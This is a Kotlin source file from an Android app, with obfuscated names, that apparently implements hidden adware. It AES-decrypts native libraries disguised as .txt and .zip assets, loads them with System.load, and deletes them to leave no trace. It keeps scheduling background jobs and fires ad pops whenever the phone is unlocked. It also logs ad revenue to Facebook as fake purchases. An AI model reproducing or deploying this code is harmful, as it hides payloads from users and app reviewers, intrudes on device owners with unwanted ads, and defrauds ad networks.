package b2

import android.app.Application
import android.app.KeyguardManager
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Context.JOB_SCHEDULER_SERVICE
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import com.ak.impI.Core
import com.ak.impI.RegisAc
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.kijz.laisk.kzma.AsuijJozk
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object AdE {
    private var sK = "" // 16, 24, or 32 bytes
    private var mContext: Application = Core.mApp

    @JvmStatic
    var isSAd = false
    private var lastSAdTime = 0L

    @JvmStatic
    val mAdC: AdCenter = AdCenter()

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var mInstallWait = 40000
    private var cTime = 30000L
    private var tPer = 40000
    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数
    private var nTryMax = 50 // 失败上限

    private var numHour = Core.getInt("show_hour_num")
    private var numDay = Core.getInt("show_day_num")
    private var isCurDay = Core.getStr("last_cur_day")
    private var numJumps = Core.getInt("num_jumps_page")

    @JvmStatic
    var isLoadH = false
    private var tagL = ""
    private var timeDS = 100L
    private var timeDE = 400L
    private var maxShowTime = 10000L // 最大显示时间

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1) return 100L
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        Core.saveInt("num_jumps_page", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
        sC()
        mAdC.loadAd()
    }

    private var isPost = false
    private fun pL() {
        if (isPost) return
        isPost = true
        Core.pE("advertise_limit")
    }

    private fun sC() {
        Core.saveInt("show_hour_num", numHour)
        Core.saveInt("show_day_num", numDay)
    }

    private fun isCurH(): Boolean {
        val s = Core.getStr("last_hout_time")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        Core.saveC("last_hout_time", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            Core.saveC("last_cur_day", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            sC()
        }
        if (isCurH().not()) {
            numHour = 0
            sC()
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        return false
    }

    @JvmStatic
    fun a2() {
        mContext.registerActivityLifecycleCallbacks(RegisAc())
        File("${mContext.dataDir}/care").mkdirs()
        refConfigure()
        t()
    }

    private var lastStr = ""
    private fun refConfigure() {
        val str = Core.getStr("")
        if (str != lastStr) {
            lastStr = str
            reConfig(JSONObject(str))
        }
    }

    private fun reConfig(js: JSONObject) {
        sK = js.optString("igloo_ks")
        tagL = js.optString("igloo_name")
        mAdC.setAdId(js.optString("dahlia_id_h"), js.optString("dahlia_idL"))
        val lt = js.optString("dahlia_t").split("-")
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        mInstallWait = lt[2].toInt() * 1000
        nHourShowMax = lt[3].toInt()
        nDayShowMax = lt[4].toInt()
        nTryMax = lt[5].toInt()
        timeDS = lt[6].toLong()
        timeDE = lt[7].toLong()
        maxShowTime = lt[8].toLong() * 1000
    }

    private fun t() {
        if (numJumps > nTryMax) {
            Core.pE("pop_fail")
            return
        }
        val is64i = is64a()
        mMainScope.launch {
            Core.pE("test_s_dec")
            val time = System.currentTimeMillis()
            val i: Boolean
            withContext(Dispatchers.IO) {
                i = loadSFile(if (is64i) "quick.txt" else "zzz.zip")
            }
            if (i.not()) {
                Core.pE("ss_l_f", "$is64i")
                return@launch
            }
            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
            opm.z.cd.f(2, 1.0, tagL)
            while (true) {
                openJob()
                cAction()
                delay(cTime)
                if (numJumps > nTryMax) {
                    Core.pE("pop_fail")
                    break
                }
            }
        }

        mMainScope.launch(Dispatchers.IO) {
            delay(1000)
            if (loadSFile(if (is64i) "unity/quw93" else "unity/qius.txt")) {
                withContext(Dispatchers.Main) {
                    try {
                        opm.z.cd.a(mContext)
                        isLoadH = true
                    } catch (_: Throwable) {
                    }
                }
            }
        }
    }

    private fun loadSFile(assetsName: String): Boolean {
        val assetsInputS = mContext.assets.open(assetsName)
        val fileSoName = "A_${System.currentTimeMillis()}"
        val file = File("${mContext.filesDir}/Cache")
        if (file.exists().not()) {
            file.mkdirs()
        }
        try {
            decrypt(assetsInputS, File(file.absolutePath, fileSoName))
            val file2 = File(file.absolutePath, fileSoName)
            System.load(file2.absolutePath)
            file2.delete()
            return true
        } catch (_: Exception) {
        }
        return false
    }


    // 解密
    private fun decrypt(inputFile: InputStream, outputFile: File) {
        val key = SecretKeySpec(sK.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputStream = FileOutputStream(outputFile)
        val inputBytes = inputFile.readBytes()
        val outputBytes = cipher.doFinal(inputBytes)
        outputStream.write(outputBytes)
        outputStream.close()
        inputFile.close()
    }

    private fun is64a(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }


    private fun cAction() {
        Core.pE("ad_session")
        if (l().not()) return
        Core.pE("ad_light")
        if (isLi()) {
            Core.pE("ad_pass", "limit")
            return
        }
        mAdC.loadAd()
        if (System.currentTimeMillis() - Core.insAppTime < mInstallWait) {
            Core.pE("ad_pass", "1t")
            return
        }
        if (System.currentTimeMillis() - lastSAdTime < tPer) {
            Core.pE("ad_pass", "2t")
            return
        }
        if (isSAd && System.currentTimeMillis() - lastSAdTime < maxShowTime) {
            Core.pE("ad_pass", "s")
            return
        }
        Core.pE("ad_pass", "N")
        CoroutineScope(Dispatchers.Main).launch {
            if (c.a.b()) {
                if (isSAd) {
                    delay(1200)
                } else {
                    delay(800)
                }
            }
            sNumJump(numJumps++)
            Core.pE("ad_start")
            opm.z.cd.f(2, 1.0, "ozfresh")
        }
    }

    private fun l(context: Context = mContext): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    @JvmStatic
    fun postEcpm(e: Double) {
        try {
            val b = Bundle()
            b.putDouble(FirebaseAnalytics.Param.VALUE, e)
            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent("ad_impression_exp", b)
        } catch (_: Exception) {
        }
        if (FacebookSdk.isInitialized().not()) return
        //fb purchase
        AppEventsLogger.newLogger(Core.mApp).logPurchase(
            e.toBigDecimal(), Currency.getInstance("USD")
        )
    }

    private var time = 0L
    private fun openJob() {
        if (System.currentTimeMillis() - time < 15000) return
        time = System.currentTimeMillis()
        val componentName = ComponentName(mContext, AsuijJozk::class.java)
        try {
            val jobInfo: JobInfo =
                JobInfo.Builder(3215, componentName)
                    .setMinimumLatency(3000) // 至少延迟 5 秒
                    .build()
            val jobScheduler = mContext.getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
            jobScheduler.schedule(jobInfo)
        } catch (_: Exception) {
        }
    }
}